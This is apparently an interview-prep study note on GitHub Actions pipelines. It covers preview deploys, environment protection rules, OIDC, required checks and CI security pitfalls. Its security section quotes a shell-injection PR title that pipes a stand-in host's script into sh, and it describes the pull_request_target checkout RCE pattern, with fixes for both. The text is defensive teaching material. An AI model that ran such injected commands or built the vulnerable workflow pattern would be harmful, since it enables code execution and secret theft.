# Deploys, gates, and not getting owned

Getting a pipeline green is half the job. The other half is deciding what green *means* —
which checks are load-bearing, who can bypass them, and what a malicious PR can actually
do to your workflow before a human reviews a single line.

## Preview deploys per PR

Commenting a live preview URL on every PR is one of the highest-leverage things CI can do
for a frontend team — a reviewer clicks a link instead of pulling a branch. Two ways to
get there:

- **Platform integration** (Vercel, Netlify, Cloudflare Pages GitHub App). The platform
  watches the repo directly, builds and deploys on its own infrastructure, and posts the
  comment itself. No workflow YAML required, but also no control over the build
  environment — you're running their build image, not yours.
- **CLI inside Actions** (`vercel deploy`, `netlify deploy`, `wrangler pages deploy`) run
  as a step in your own `preview` job, using the same `dist/` artifact your `build` job
  already produced. More control, more YAML, and it needs a deploy token as a secret.

That secret is where fork PRs bite. `pull_request` from a fork runs with a **read-only**
`GITHUB_TOKEN` and, critically, **no access to repository secrets** — GitHub withholds
them specifically so a stranger's PR can't exfiltrate your deploy token by editing the
workflow file in their own branch and having it run with your secrets attached. That's
correct and should not be worked around. The practical fix is `pull_request_target`
running a separate, minimal job that only builds and deploys — never checking out and
running the fork's own code with elevated permissions (see the security section below for
exactly why that combination is dangerous), or gating the preview job behind a maintainer
approval for first-time contributors, which GitHub supports natively.

## Environments and protection rules

A GitHub **environment** (Settings → Environments) is a named target — `staging`,
`production`, `preview` — that a job references via `environment: production`. Attaching
one buys you protection rules: required reviewers (a human must click approve before the
job runs), a wait timer, and environment-scoped secrets that only jobs targeting that
environment can read. A `production` environment with a required reviewer is the cheap
version of a deploy gate — no extra tooling, just a checkbox a teammate clicks.

## OIDC instead of long-lived cloud keys

The old pattern — an AWS access key or a GCP service-account JSON stored as a repository
secret — is a static, long-lived credential sitting in GitHub's secret store indefinitely.
**OIDC** (`permissions: { id-token: write }` plus a cloud-side trust policy scoped to your
repo and branch) has GitHub mint a short-lived token *for that one job run*, which the
cloud provider exchanges for temporary credentials. Nothing long-lived is stored anywhere;
a leaked workflow log can't leak a reusable key because there isn't one. AWS, Azure, and
GCP all support this pattern for their respective Actions (`aws-actions/configure-aws-credentials`
and equivalents) — prefer it over static keys for any new pipeline.

## Required checks, rulesets, and merge queues

A green workflow run means nothing on its own until branch protection (or the newer
**repository rulesets**) marks specific job names as **required status checks** — only
then does GitHub block the merge button until they pass. Two gotchas worth knowing before
you hit them: a required check name has to match a job name exactly, so renaming a job
silently "removes" a required check until someone re-adds it under the new name; and a
workflow gated by `paths` that doesn't run at all on a given PR leaves its required check
perpetually pending, not passing — a PR that touches nothing matched by the filter can get
stuck unless you handle the no-run case (a cheap always-run job, or scoping the requirement
correctly).

A **merge queue** batches approved PRs and tests each one merged against the *latest* main
plus the PRs ahead of it in the queue, firing `merge_group` instead of `pull_request` for
that run — catching the case where two independently-fine PRs conflict once both land,
before either actually merges.

## Keeping the actions themselves current

Dependabot and Renovate don't just bump `package.json` — both support a `github-actions`
ecosystem that opens PRs bumping pinned action SHAs when the upstream tag moves, so pinning
to a commit (see below) doesn't mean freezing forever, just reviewing each bump as a PR
like any other dependency update.

## The security pitfalls, briefly

[[68-supply-chain-security]] already covers pinning third-party actions to a commit SHA
rather than a floating tag, and treating the install step's supply chain as untrusted by
default — that's not repeated here. Three CI-specific pitfalls sit on top of that:

- **`pull_request_target` + checkout of the PR head.** `pull_request_target` runs with the
  *base* repo's permissions and secrets, even for a fork PR — that's its whole purpose, for
  workflows that need to comment or label using a token a plain `pull_request` run can't
  get. If a workflow using it then does `actions/checkout@<sha> with: { ref: ${{ github.event.pull_request.head.sha }} }`,
  it has just checked out attacker-controlled code and given it your secrets and
  write-scoped token. This is a well-known RCE pattern; the fix is either not checking out
  the fork's code at all in that trigger, or splitting the privileged part into a separate
  workflow triggered by `workflow_run` after an unprivileged `pull_request` build finishes.
- **Script injection via event context.** `${{ github.event.pull_request.title }}` (or any
  attacker-controlled field — issue titles, commit messages, branch names) interpolated
  directly into a `run:` step is a shell injection waiting to happen: a PR titled
  `"; curl evil.sh | sh #` doesn't need code execution anywhere else in the app. The fix is
  passing it through `env:` and referencing the environment variable inside the shell
  script (`env: { TITLE: '${{ github.event.pull_request.title }}' }`, then `echo "$TITLE"`
  in `run:`) — the value becomes shell *data*, not shell *syntax*.
- **Everything else defaults open.** `permissions` unset falls back to a repo-wide default
  that may be broader than a job needs; `persist-credentials: false` on `actions/checkout`
  stops the checked-out git config from leaving the `GITHUB_TOKEN` sitting in `.git/config`
  for any later step (including a compromised dependency's postinstall script) to read.
  Hardened self-hosted or org-level runner egress controls (e.g. step-security's
  harden-runner action) are worth knowing exist for network egress monitoring, though
  verify current tooling before adopting one.

## Cost and performance, in one paragraph

Minutes aren't free past the included quota, especially on a private repo, and larger
runners multiply the per-minute rate. The controls that make a pipeline fast — caching,
path filters, concurrency cancellation, a sharded e2e run that finishes in the time of the
slowest shard instead of the sum of all of them — are the same controls that make it
cheap. A pipeline that's slow is usually also a pipeline that's expensive, and fixing the
first problem tends to fix the second for free.

## Interview angle

This is named directly in the posting, so expect a real question about pipelines you've
maintained, not just used. The strongest material here is the security section: fork PRs get a
read-only `GITHUB_TOKEN` and no repository secrets by design, and `pull_request_target` combined
with checking out the fork's own code is a well-known way to hand an attacker your deploy
credentials — exactly the kind of mistake a defense-adjacent org's security review exists to
catch. Be ready to talk about OIDC replacing long-lived cloud keys as repository secrets: a
short-lived token minted per job run instead of a static credential sitting in GitHub's secret
store indefinitely is a concrete, current best practice you can describe without hand-waving.
Also worth having ready: environments with required reviewers as the cheap version of a deploy
gate, and why a required status check that never runs on a filtered PR gets stuck pending rather
than passing — a real gotcha, not a trivia fact.

**Likely follow-up:** Walk me through what happens, step by step, when an external contributor
opens a PR against this repo that touches a workflow file. What can they access, and what can't
they?

**Pitfall:** Describing CI/CD purely as "make the tests run green" without addressing who can
trigger a deploy and with what credentials. On a small team where you own what you ship, the
pipeline is also the access-control boundary, and candidates who haven't thought about fork PRs or
secret scoping tend to reveal that fast under a follow-up.

## Further reading (optional)

- [GitHub Docs — Security hardening for GitHub Actions](https://docs.github.com/actions/security-guides/security-hardening-for-github-actions)
- [GitHub Docs — Using OpenID Connect to get access to cloud resources](https://docs.github.com/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)
- [GitHub Docs — Managing an environment](https://docs.github.com/actions/deployment/targeting-different-environments/using-environments-for-deployment)
- [GitHub Docs — Managing a merge queue](https://docs.github.com/repositories/configuring-branches-and-merges-in-your-repository/configuring-pull-request-merges/managing-a-merge-queue)
